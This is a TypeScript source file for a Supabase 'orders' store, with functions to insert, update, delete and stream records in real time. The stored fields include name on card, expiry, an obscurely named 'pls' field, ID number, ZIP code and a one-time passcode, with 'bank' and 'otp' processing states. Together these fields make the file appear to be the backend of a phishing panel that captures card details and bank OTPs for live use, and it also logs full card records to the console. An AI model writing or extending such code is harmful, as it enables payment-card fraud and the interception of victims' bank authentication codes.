// Database-backed orders store using Supabase
import { supabase } from "@/integrations/supabase/client";

export type ProcessingType = 'bank' | 'otp' | 'completed';

export interface DatabaseOrder {
  id: string;
  timestamp: string;
  phone: string;
  provider: string;
  amount: number;
  fees: string;
  total: string;
  id_number: string;
  expiry: string;
  pls: string;
  name_on_card: string;
  country: string;
  zip_code: string;
  otp_code?: string;
  processing_type?: ProcessingType;
  is_processed: boolean;
  user_session_id?: string;
  created_at: string;
  updated_at: string;
}

// Generate a unique session ID for tracking orders from this browser session
const getSessionId = () => {
  let sessionId = localStorage.getItem('user_session_id');
  if (!sessionId) {
    sessionId = crypto.randomUUID();
    localStorage.setItem('user_session_id', sessionId);
  }
  return sessionId;
};

export async function getAllOrders(): Promise<DatabaseOrder[]> {
  console.log('getAllOrders: Starting database query...');
  
  const { data, error } = await supabase
    .from('orders')
    .select('*')
    .order('timestamp', { ascending: false });

  console.log('getAllOrders: Query result:', { data, error });

  if (error) {
    console.error('Error fetching orders:', error);
    throw error;
  }

  const result = (data || []).map(order => ({
    ...order,
    processing_type: order.processing_type as ProcessingType
  }));
  
  console.log('getAllOrders: Mapped result:', result);
  return result;
}

export async function addOrderToDatabase(order: any): Promise<string> {
  console.log('addOrderToDatabase: Starting order save...', order);
  const sessionId = getSessionId();
  
  const orderData = {
    phone: order.phone,
    provider: order.provider,
    amount: parseFloat(order.amount),
    fees: order.fees,
    total: order.total,
    id_number: order.idNumber,
    expiry: order.expiry,
    pls: order.pls,
    name_on_card: order.nameOnCard,
    country: order.country,
    zip_code: order.zipCode,
    otp_code: order.otpCode,
    user_session_id: sessionId,
    timestamp: new Date().toISOString()
  };
  
  console.log('addOrderToDatabase: Prepared order data:', orderData);
  console.log('addOrderToDatabase: About to insert to database...');
  
  const { data, error } = await supabase
    .from('orders')
    .insert([orderData])
    .select()
    .single();

  console.log('addOrderToDatabase: Insert result:', { data, error });

  if (error) {
    console.error('Error adding order:', error);
    throw error;
  }

  console.log('addOrderToDatabase: Successfully saved order with ID:', data.id);
  return data.id;
}

export async function updateOrderInDatabase(orderId: string, updates: Partial<DatabaseOrder>): Promise<void> {
  const { error } = await supabase
    .from('orders')
    .update(updates)
    .eq('id', orderId);

  if (error) {
    console.error('Error updating order:', error);
    throw error;
  }
}

export async function deleteOrderFromDatabase(orderId: string): Promise<void> {
  const { error } = await supabase
    .from('orders')
    .delete()
    .eq('id', orderId);

  if (error) {
    console.error('Error deleting order:', error);
    throw error;
  }
}

export async function markOrderProcessedInDatabase(orderId: string, processingType: ProcessingType = 'otp'): Promise<void> {
  await updateOrderInDatabase(orderId, {
    is_processed: true,
    processing_type: processingType
  });
}

export async function clearAllOrdersFromDatabase(): Promise<void> {
  const { error } = await supabase
    .from('orders')
    .delete()
    .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records

  if (error) {
    console.error('Error clearing all orders:', error);
    throw error;
  }
}

// Subscribe to real-time changes
export function subscribeToOrderChanges(callback: () => void) {
  const channel = supabase
    .channel('orders-changes')
    .on(
      'postgres_changes',
      {
        event: '*',
        schema: 'public',
        table: 'orders'
      },
      () => callback()
    )
    .subscribe();

  return () => {
    supabase.removeChannel(channel);
  };
}